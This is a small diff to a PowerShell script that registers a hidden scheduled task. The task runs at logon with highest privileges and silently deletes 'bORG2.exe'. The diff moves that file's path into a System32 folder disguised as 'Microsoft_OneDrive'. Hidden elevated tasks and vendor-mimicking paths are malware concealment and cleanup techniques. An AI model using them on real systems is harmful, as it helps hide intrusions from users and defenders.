@@ -1,4 +1,4 @@
-$action = New-ScheduledTaskAction -Execute 'cmd' -Argument '/c start /min "" powershell rm "$env:TMP\bORG2.exe" -r -Force -ErrorAction SilentlyContinue'
+$action = New-ScheduledTaskAction -Execute 'cmd' -Argument '/c start /min "" powershell rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\bORG2.exe" -r -Force -ErrorAction SilentlyContinue'
 $trigger = New-ScheduledTaskTrigger -AtLogon
 $principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -AllowStartIfOnBatteries
